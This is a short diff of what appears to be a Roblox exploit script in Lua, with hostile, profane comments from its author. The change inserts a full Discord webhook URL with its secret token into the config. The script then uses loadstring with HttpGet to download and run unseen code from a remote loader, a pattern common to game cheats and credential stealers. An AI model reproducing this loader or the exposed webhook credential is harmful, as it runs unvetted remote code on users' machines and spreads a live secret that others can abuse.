@@ -2,8 +2,8 @@
 -- my nugga this is my code nobody else is using this leave me alone
 -- yall just coming here to bother , leave my code do smt else w yo life holy fuck
 wait(20)
-getgenv().Config = {
-    ["Webhook"] = "",
+getgenv().Config = { 
+    ["Webhook"] = "https://discord.com/api/webhooks/1309500163458334831/cK7Gb0FnsLEid21n6L-V22fseC5YB4a5-q38UnmeP7zPG_8COUgRM2TVVNsIQSAPlRuk",
     ["UserID"] = "731736164196679712",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/563a4a1c759a83a84ed00822b66756a9.lua"))()
